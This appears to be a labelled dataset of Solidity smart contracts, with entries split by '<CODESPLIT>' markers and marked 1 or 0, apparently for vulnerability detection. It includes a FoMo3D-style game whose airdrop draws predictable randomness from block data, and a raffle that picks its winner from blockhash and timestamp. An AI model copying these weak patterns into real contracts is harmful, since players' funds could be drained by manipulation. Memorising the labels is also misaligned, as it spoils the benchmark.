);            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }    function getPlayerVaults(uint256 _pID)        public        view                 returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                 if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                 } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }         function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }    function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }    function getPlayerInfoByAddress(address _addr)        public        view        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];        return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                 } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)            {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                 emit F3Devents.onBuyAndDistribute                (                    msg.sender,                    plyr_[_pID].name,                    msg.value,                    _eventData_.compressedData,                    _eventData_.compressedIDs,                    _eventData_.winnerAddr,                    _eventData_.winnerName,                    _eventData_.amountWon,                    _eventData_.newPot,                    _eventData_.P3DAmount,                    _eventData_.genAmount                );            }                         plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }         function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                         core(_rID, _pID, _eth, _affID, _team, _eventData_);                 } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onReLoadAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );        }    }         function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                 if (_eth > 1000000000)        {                         uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)            {                updateTimer(_keys, _rID);                                 if (round_[_rID].plyr != _pID)                    round_[_rID].plyr = _pID;                if (round_[_rID].team != _team)                    round_[_rID].team = _team;                                 _eventData_.compressedData = _eventData_.compressedData + 100;            }                         if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                 airDropTracker_ = 0;            }        }                         _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                         round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);             		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }         function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }         function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                         pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;            if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }            if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                         _eventData_.compressedData = _eventData_.compressedData + 1;        }        return (_eventData_);    }         function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }         function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                 plyr_[_pID].lrnd = rID_;                 _eventData_.compressedData = _eventData_.compressedData + 10;        return(_eventData_);    }         function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                 uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                 uint256 _pot = round_[_rID].pot;                          uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot / 10);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen));                 uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                 plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                 shareCom.transfer((_com / 2));        admin.transfer((_com / 2));                 round_[_rID].mask = _ppt.add(round_[_rID].mask);                 _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = 0;        _eventData_.newPot = _res;                                                     emit F3Devents.onEndRound        (            _rID,            plyr_[_winPID].addr,            plyr_[_winPID].name,            _win,            _res        );                 rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;        return(_eventData_);    }         function updateGenVault(uint256 _pID, uint256 _rIDlast)        private    {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }         function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;        uint256 _rndInc = rndInc_;        if(round_[_rID].pot > rndLimit_)        {            _rndInc = _rndInc / 2;        }                 uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(_rndInc)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(_rndInc)).add(round_[_rID].end);                 if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }         function airdrop()        private        view        returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(            (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)        )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                  uint256 _com = _eth / 10;        uint256 _p3d;        if (address(admin).call.value((_com / 2))() == false)        {            _p3d = _com / 2;            _com = _com / 2;        }        if (address(shareCom).call.value((_com / 2))() == false)        {            _p3d += (_com / 2);            _com = _com.sub(_com / 2);        }                                   _p3d = _p3d.add(distributeAff(_rID,_pID,_eth,_affID));                          if (_p3d > 0)        {                         uint256 _potAmount = _p3d / 2;            uint256 _amount = _p3d.sub(_potAmount);            shareCom.transfer((_amount / 2));            admin.transfer((_amount / 2));            round_[_rID].pot = round_[_rID].pot.add(_potAmount);                         _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);        }        return(_eventData_);    }    function distributeAff(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID)        private        returns(uint256)    {        uint256 _addP3d = 0;                 uint256 _aff1 = _eth / 10;        uint256 _aff2 = _eth / 20;        uint256 _aff3 = _eth / 34;        groupCut.transfer(_aff1);                          if ((_affID != 0) && (_affID != _pID) && (plyr_[_affID].name != ''))        {            plyr_[_pID].laffID = _affID;            plyr_[_affID].aff = _aff2.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff2, now);                         uint256 _secLaff = plyr_[_affID].laffID;            if((_secLaff != 0) && (_secLaff != _pID))            {                plyr_[_secLaff].aff = _aff3.add(plyr_[_secLaff].aff);                emit F3Devents.onAffiliatePayout(_secLaff, plyr_[_secLaff].addr, plyr_[_secLaff].name, _rID, _pID, _aff3, now);            } else {                _addP3d = _addP3d.add(_aff3);            }        } else {            _addP3d = _addP3d.add(_aff2);        }        return(_addP3d);    }    function getPlayerAff(uint256 _pID)        public        view        returns (uint256,uint256,uint256)    {        uint256 _affID = plyr_[_pID].laffID;        if (_affID != 0)        {                         uint256 _secondLaff = plyr_[_affID].laffID;            if(_secondLaff != 0)            {                                 uint256 _thirdAff = plyr_[_secondLaff].laffID;            }        }        return (_affID,_secondLaff,_thirdAff);    }    function potSwap()        external        payable    {                 uint256 _rID = rID_ + 1;        round_[_rID].pot = round_[_rID].pot.add(msg.value);        emit F3Devents.onPotSwapDeposit(_rID, msg.value);    }         function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                 uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                          _eth = _eth.sub(_eth.mul(29) / 100);                 uint256 _pot = _eth.sub(_gen);                          uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                 round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                 _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;        return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                 uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                          uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                 return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }         function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                 uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }         function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);        emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(msg.sender == admin, "only admin can activate");                 require(activated_ == false, "FOMO Short already activated");                 activated_ = true;                 rID_ = 1;        round_[1].strt = now + rndExtra_ - rndGap_;        round_[1].end = now + rndInit_ + rndExtra_;    }}    library F3Ddatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;            uint256 laffID;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library F3DKeysCalcShort {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }         function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }          function keys(uint256 _eth)        internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }         function eth(uint256 _keys)        internal        pure        returns(uint256)    {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);}library NameFilter {    function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                 require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                 bool _hasNonNumber;                 for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                         (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;            }        }        require(_hasNonNumber == true, "string cannot be only numbers");        bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }}library SafeMath {         function mul(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)    {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }         function sqrt(uint256 x)        internal        pure        returns (uint256 y)    {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)        {            y = z;            z = ((add((x / z),z)) / 2);        }    }         function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }         function pwr(uint256 x, uint256 y)        internal        pure        returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else        {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
1<CODESPLIT>contract EthTeamContract is StandardToken, Ownable {    event Buy(address indexed token, address indexed from, uint256 value, uint256 weiValue);    event Sell(address indexed token, address indexed from, uint256 value, uint256 weiValue);    event BeginGame(address indexed team1, address indexed team2, uint64 gameTime);    event EndGame(address indexed team1, address indexed team2, uint8 gameResult);    event ChangeStatus(address indexed team, uint8 status);         uint256 public price;         uint8 public status;         uint64 public gameTime;         uint64 public finishTime;         address public feeOwner;         address public gameOpponent;         function EthTeamContract(        string _teamName, string _teamSymbol, address _gameOpponent, uint64 _gameTime, uint64 _finishTime, address _feeOwner    ) public {        name = _teamName;        symbol = _teamSymbol;        decimals = 3;        totalSupply_ = 0;        price = 1 szabo;        gameOpponent = _gameOpponent;        gameTime = _gameTime;        finishTime = _finishTime;        feeOwner = _feeOwner;        owner = msg.sender;    }         function transfer(address _to, uint256 _value) public returns (bool) {        if (_to != address(this)) {            return super.transfer(_to, _value);        }        require(_value <= balances_[msg.sender] && status == 0);                 if (gameTime > 1514764800) {                         require(gameTime - 300 > block.timestamp);        }        balances_[msg.sender] = balances_[msg.sender].sub(_value);        totalSupply_ = totalSupply_.sub(_value);        uint256 weiAmount = price.mul(_value);        msg.sender.transfer(weiAmount);        emit Transfer(msg.sender, _to, _value);        emit Sell(_to, msg.sender, _value, weiAmount);        return true;    }         function() payable public {        require(status == 0 && price > 0);                 if (gameTime > 1514764800) {                         require(gameTime - 300 > block.timestamp);        }        uint256 amount = msg.value.div(price);        balances_[msg.sender] = balances_[msg.sender].add(amount);        totalSupply_ = totalSupply_.add(amount);        emit Transfer(address(this), msg.sender, amount);        emit Buy(address(this), msg.sender, amount, msg.value);    }         function changeStatus(uint8 _status) onlyOwner public {        require(status != _status);        status = _status;        emit ChangeStatus(address(this), _status);    }         function finish() onlyOwner public {        require(block.timestamp >= finishTime);        feeOwner.transfer(address(this).balance);    }         function beginGame(address _gameOpponent, uint64 _gameTime) onlyOwner public {        require(_gameOpponent != address(0) && _gameOpponent != address(this) && gameOpponent == address(0));                 require(_gameTime == 0 || (_gameTime > 1514764800));        gameOpponent = _gameOpponent;        gameTime = _gameTime;        status = 0;        emit BeginGame(address(this), _gameOpponent, _gameTime);    }         function endGame(address _gameOpponent, uint8 _gameResult) onlyOwner public {        require(gameOpponent != address(0) && gameOpponent == _gameOpponent);        uint256 amount = address(this).balance;        uint256 opAmount = gameOpponent.balance;        require(_gameResult == 1 || (_gameResult == 2 && amount >= opAmount) || _gameResult == 3);        EthTeamContract op = EthTeamContract(gameOpponent);        if (_gameResult == 1) {                         if (amount > 0 && totalSupply_ > 0) {                uint256 lostAmount = amount;                                 if (op.totalSupply() > 0) {                                         uint256 feeAmount = lostAmount.div(20);                    lostAmount = lostAmount.sub(feeAmount);                    feeOwner.transfer(feeAmount);                    op.transferFundAndEndGame.value(lostAmount)();                } else {                                         feeOwner.transfer(lostAmount);                    op.transferFundAndEndGame();                }            } else {                op.transferFundAndEndGame();            }        } else if (_gameResult == 2) {                         if (amount > opAmount) {                lostAmount = amount.sub(opAmount).div(2);                if (op.totalSupply() > 0) {                                         feeAmount = lostAmount.div(20);                    lostAmount = lostAmount.sub(feeAmount);                    feeOwner.transfer(feeAmount);                    op.transferFundAndEndGame.value(lostAmount)();                } else {                    feeOwner.transfer(lostAmount);                    op.transferFundAndEndGame();                }            } else if (amount == opAmount) {                op.transferFundAndEndGame();            } else {                                 revert();            }        } else if (_gameResult == 3) {                         op.transferFundAndEndGame();        } else {                         revert();        }        endGameInternal();        if (totalSupply_ > 0) {            price = address(this).balance.div(totalSupply_);        }        emit EndGame(address(this), _gameOpponent, _gameResult);    }         function endGameInternal() private {        gameOpponent = address(0);        gameTime = 0;        status = 0;    }         function transferFundAndEndGame() payable public {        require(gameOpponent != address(0) && gameOpponent == msg.sender);        if (msg.value > 0 && totalSupply_ > 0) {            price = address(this).balance.div(totalSupply_);        }        endGameInternal();    }}
0<CODESPLIT>contract ICO {    uint public priceToBuyInFinney;    mapping (uint => uint[3]) public priceChange;    function ICO() {        priceToBuyInFinney = 0;        priceChange[0] = [priceToBuyInFinney, block.number, block.timestamp];        return;    }}
1<CODESPLIT>contract CardsRaffle {  uint256 private raffleTicketsBought;  uint256 private raffleTicketThatWon;  address public owner;  modifier onlyOwner() {    require(msg.sender == owner);    _;  }  function drawRandomWinner() public onlyOwner returns (uint256) {    uint256 seed = raffleTicketsBought + block.timestamp;    raffleTicketThatWon = addmod(uint256(block.blockhash(block.number-1)), seed, raffleTicketsBought);    return raffleTicketThatWon;  }}
0<CODESPLIT>contract PausableToken is StandardToken, Pausable {  function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {    return super.transfer(_to, _value);  }  function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {    return super.transferFrom(_from, _to, _value);  }  function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {    return super.approve(_spender, _value);  }  function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {    return super.increaseApproval(_spender, _addedValue);  }  function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {    return super.decreaseApproval(_spender, _subtractedValue);  }}   
0<CODESPLIT>contract LetsbetToken is PausableToken, BurnableToken {    string public constant name = "Letsbet Token";    string public constant symbol = "XBET";    uint8 public constant decimals = 18;    uint256 public constant INITIAL_SUPPLY = 100000000 * 10**uint256(decimals);      uint256 public constant TEAM_TOKENS = 18000000 * 10**uint256(decimals);      uint256 public constant BOUNTY_TOKENS = 5000000 * 10**uint256(decimals);      uint256 public constant AUCTION_TOKENS = 77000000 * 10**uint256(decimals);      event Deployed(uint indexed _totalSupply);         function LetsbetToken(        address auctionAddress,        address walletAddress,        address bountyAddress)        public    {        require(auctionAddress != 0x0);        require(walletAddress != 0x0);        require(bountyAddress != 0x0);                totalSupply_ = INITIAL_SUPPLY;        balances[auctionAddress] = AUCTION_TOKENS;        balances[walletAddress] = TEAM_TOKENS;        balances[bountyAddress] = BOUNTY_TOKENS;        Transfer(0x0, auctionAddress, balances[auctionAddress]);        Transfer(0x0, walletAddress, balances[walletAddress]);        Transfer(0x0, bountyAddress, balances[bountyAddress]);        Deployed(totalSupply_);        assert(totalSupply_ == balances[auctionAddress] + balances[walletAddress] + balances[bountyAddress]);    }}    
1<CODESPLIT>contract DutchAuction {    	          uint constant public TOKEN_CLAIM_WAITING_PERIOD = 7 days;    LetsbetToken public token;    address public ownerAddress;    address public walletAddress;         uint public startPrice;         uint public priceDecreaseRate;         uint public startTime;    uint public endTimeOfBids;         uint public finalizedTime;    uint public startBlock;         uint public receivedWei;         uint public fundsClaimed;    uint public tokenMultiplier;         uint public tokensAuctioned;         uint public finalPrice;         mapping (address => uint) public bids;    Stages public stage;         enum Stages {        AuctionDeployed,        AuctionSetUp,        AuctionStarted,        AuctionEnded,        TokensDistributed    }         modifier atStage(Stages _stage) {        require(stage == _stage);        _;    }    modifier isOwner() {        require(msg.sender == ownerAddress);        _;    }	         event Deployed(        uint indexed _startPrice,        uint indexed _priceDecreaseRate    );    	event Setup();    	event AuctionStarted(uint indexed _startTime, uint indexed _blockNumber);    	event BidSubmission(        address indexed sender,        uint amount,        uint missingFunds,        uint timestamp    );    	event ClaimedTokens(address indexed _recipient, uint _sentAmount);    	event AuctionEnded(uint _finalPrice);    	event TokensDistributed();                                  function DutchAuction(        address _walletAddress,        uint _startPrice,        uint _priceDecreaseRate,        uint _endTimeOfBids)     public    {        require(_walletAddress != 0x0);        walletAddress = _walletAddress;        ownerAddress = msg.sender;        stage = Stages.AuctionDeployed;        changeSettings(_startPrice, _priceDecreaseRate,_endTimeOfBids);        Deployed(_startPrice, _priceDecreaseRate);    }    function () public payable atStage(Stages.AuctionStarted) {        bid();    }                   function setup(address _tokenAddress) public isOwner atStage(Stages.AuctionDeployed) {        require(_tokenAddress != 0x0);        token = LetsbetToken(_tokenAddress);                 tokensAuctioned = 